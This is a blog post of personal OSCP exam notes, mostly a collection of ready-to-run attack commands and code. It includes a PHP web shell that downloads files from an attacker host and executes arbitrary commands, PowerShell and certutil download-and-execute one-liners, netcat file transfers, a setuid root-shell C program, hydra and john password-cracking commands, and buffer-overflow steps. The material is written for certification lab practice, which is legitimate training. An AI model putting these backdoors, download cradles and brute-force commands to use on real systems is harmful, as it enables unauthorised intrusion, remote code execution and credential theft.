---
published: true
layout: post
title: "Useful OSCP Notes & Commands"
categories: [OSCP]
tags: [Pentesting, Exam]
---

![img](https://miro.medium.com/proxy/0*cFufqYlUCHsfS1pI.png)

Offensive Security OSCP Logo

After finally passing my OSCP Exam I figured I would create a post with my useful notes and commands. These notes / commands should be spoiler free of machines in both the lab and the exam and are not specific to any particular machine.

I will try to break these up into proper categories / sections that accurately reflects the note / command.

Without further ado in no particular order:

# Buffer Overflow

**Finding your EIP Offset**
If you know how long your buffer is before the exploit crashes (e.g 4000 characters) you can use the pattern_create script with the -l (lowercase L) flag to create a unique pattern.

Using the above example

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4000
```

Once you’ve inserted the above output into your skeleton script, copy down the output of what appears in EIP. Then give pattern_offset a run

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4000 -q <insert your EIP Unique string>
```

**Finding Bad Characters**
I felt it was necessary to have a copy of all the ASCII characters laying around for the buffer overflow. This made it easy to copy and paste into BOF skeleton scripts. I also determined the buffer size of the variable so you can modify the skeleton script as you go.

```
badchar = (“\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10”“\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20”“\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30”“\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40”“\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50”“\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60”“\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70”“\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80”“\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90”“\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0”“\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0”“\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0”“\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0”“\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0”“\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0”“\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff”)

255 bytes
```

I’d suggest taking the bad characters above and inserting it after your 4 bytes that controls the EIP (Your “B” characters or whatever). Remove bad characters as you go.

There is of course all of the Mona tools at your disposal as well. However, I did not use any of them.

# Initial Enumeration Steps

**Manual Steps**

```
nmap -sC -sV IP_ADDR

nmap -sC -sV -p- IP_ADDR

nmap -sU -sV --top-ports 20 IP_ADDR

nmap --script vuln IP_ADDR
```

I created a fairly basic Perl scrip that utilizes netcat to give more useful info about UDP ports being open. Code is below:

```
#!/usr/bin/perl
use strict;
use warnings;

my @topPorts = (52, 67, 68, 69, 123, 135, 137, 138, 139, 161, 162, 445, 500, 514,520,631,1434,1900,4500,49152);

my $nc = "/bin/nc";

my $outFile;
my $target;

if(@ARGV < 2) { 
	print("Usage: $0 <target> <output file> \n"); 
	print("Example: perl $0 XXX.XXX.XXX.XXX udp_scan.txt \n");        
	print("cat udp_scan.txt | grep -v \"?\" \n"); 
	exit(1);
}

($target, $outFile) = @ARGV;

print("Performing Top 20 UDP Port Scan against: $target \n");
print("Output File: $outFile \n");

open(FILE, ">", $target) or die("$!");
close(FILE);print("Running: ");

foreach my $port (@topPorts) { 
	open(NETCAT, "-|", "$nc -nv -u -z -w 1 $target $port 2>>$outFile") or die("$!"); 		close(NETCAT); 
	print(".");
}
print(" DONE!\n");
```

Afterwards just use the below command to run / show open ports

```
perl script.pl 10.10.10.10 udp_scan.txt; cat udp_scan.txt | grep -v "?"
```

Anything showing up in the list above should be open. Of course since its UDP take it with a grain of salt.

**Automated Steps**

Download AutoRecon by Tib3rius at h[ttps://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon)

```
python3 autorecon.py -ct 4 -cs 10 -o ./ IP_1 IP_2 IP_3 IP_4
```

# File Transfer Methods

These were all the helpful methods I utilized to get files from my attacking box to the target.

**Unix Transfer Methods**

```
wget http://IP_ADDR/file -O /path/to/where/you/want/file/to/go

curl http://IP_ADDR/file

fetch http://IP_ADDR/file

nc IP_ADDR PORT > OUTFILE (run nc -lvp PORT < infile on attacking machine)

ftp -s:input.txttftp -i get file /path/on/victim
```

**Windows Transfer Methods**

```
bitsadmin /transfer download /priority normal http://IP_ADDR/file C:\output\path (Works on Windows 7/Windows Server 2000+)

nc IP_ADDR PORT > OUTFILE (run nc -lvp PORT < infile on attacking machine)

ftp -s:input.txt

tftp -i get file /path/on/victim

powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile(‘http://IP_ADDR:PORT/FILE','C:\Users\user\AppData\Local\ack.exe'));}”

certutil -urlcache -split -f “http://IP_ADDR/FILE" FILENAME
```

Useful Powershell script that allows for transferring of files as well:

```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = “http://IP_ADDR/FILE" >> wget.ps1
echo $file = “FILE” >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <filename>
```

Maybe you want to execute the above file as another user if you have their creds? This is equally helpful

```
echo $secpasswd = ConvertTo-SecureString “insert_plaintext_password_here” -AsPlainText -Force > execute.ps1
echo $mycreds = New-Object System.Management.Automation.PSCredential(“username”, $secpasswd) >> execute.ps1
echo $computer = “target_host” >> execute.ps1
echo [System.Diagnostics.Process]::Start(“C:\Users\user\Downloads\firewall.exe”, “”, $mycreds.Username, $mycreds.Password, $computer) >> execute.ps1 

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <filename>
```

# Content Management System Scanning

These tools should be helpful with some of the more popular CMS like Drupal, WordPress, Joomla, etc

```
cmsmap http://IP_ADDR -f (D,J…)

droopescan scan drupal -u http://IP_ADDR

wpscan --url http://IP_ADDR --enumerate u,p,t 
```

# Full Interactive TTY Shell

In order for this to work, the reverse shell must have been initiated from nc (netcat)

![img](https://miro.medium.com/max/30/1*NLogQjdMcsZzHPX95JdCwg.png?q=20)

![img](https://miro.medium.com/max/543/1*NLogQjdMcsZzHPX95JdCwg.png)

# PHP Backdoors

These are some of the useful PHP backdoors I used. Rather than include the code on here I will link to most of them. There is one I would like to share that I used for both Windows and Linux interchangeably

```
<?php 

if (isset($_REQUEST[‘fupload’])) { 
	file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); 
}; 

if (isset($_REQUEST[‘fexec’])) { 
	echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; 
}; 
?>
```

I shouldn’t have to explain above, but in short use <filename>.php?fupload=nc.exe (for example) and <filename>.php?fexec=nc IP PORT

- PenTest Monkey’s PHP Reverse Shell for Linux — http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Above can be located in the following path on your Kali box

```
/usr/share/webshells/php/php-reverse-shell.php
```

- Windows Equivalent to PenTest Monkey Linux Shell — [https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php](https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse Shell.php)

# Password Brute Forcing

```
unshadow passwd shadow > creds.txt

john --wordlist=rockyou.txt creds.txt 

fcrackzip -u -D -p ‘rockyou.txt’ 

zip_filezip2john zip_file > hash.txt

john --format=zip hash.txt

hydra -l username -P password_list IP_ADDR -V http-post-form ‘/path/login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location’ -t 25

hashcat -a 0 -m hash-mode hash.txt rockyou.txt
```

Useful Websites:

- https://crackstation.net/
- https://hashkiller.co.uk/
- For the hashcat command, the hash-mode list can be found here: https://hashcat.net/wiki/doku.php?id=example_hashes
- http://cracker.offensive-security.com/ (Your priority code is in OSCP Control Panel)

# OS, User, and Data Collection

**Unix**

```
rpm -qa

dkpg -lapt list --installed 

aptitude search ‘~i!~M’

uname -a

uname -m

cat /etc/*release*id
```

**Windows**

```
echo %USERNAME%

echo %USERDOMAIN%

systeminfo | findstr /B /C:”Domain”

wmic computersystem get domain

net config WorkStation

wmic os get osarchitecture

net user username

whoami /groups
```

# Web Enumeration

```
nikto -h IP_ADDR

gobuster -e -u http://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -s 200,204,301,302

dirsearch -u https://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,sh -x 404 -t 100

wfuzz -w wordlist.txt --filter "c=200 and l>0" http://IP_ADDR/somepath.php?url=FUZZ
```

dirsearch — https://github.com/maurosoria/dirsearch

# **Setuid C Program to Compile**

```
#include <unistd.h>

int main(){    
	setuid(0);    
	execl("/bin/bash", "bash", (char *)NULL);    
	return 0;
}
```

This is by no means a complete list of commands I used, programs created / used, etc for the OSCP. There is a lot I created for myself notes wise but taken from already known posts.

Other quick references:

- Local Privilege Escalation Workshop — https://github.com/sagishahar/lpeworkshop
- g0tMi1k’s Basic Linux Priv Esc — https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- Sushant747’s Windows Priv Esc — https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

Feel free to leave a comment or let’s chat on Discord https://discord.gg/eG6Nt4x if you have any questions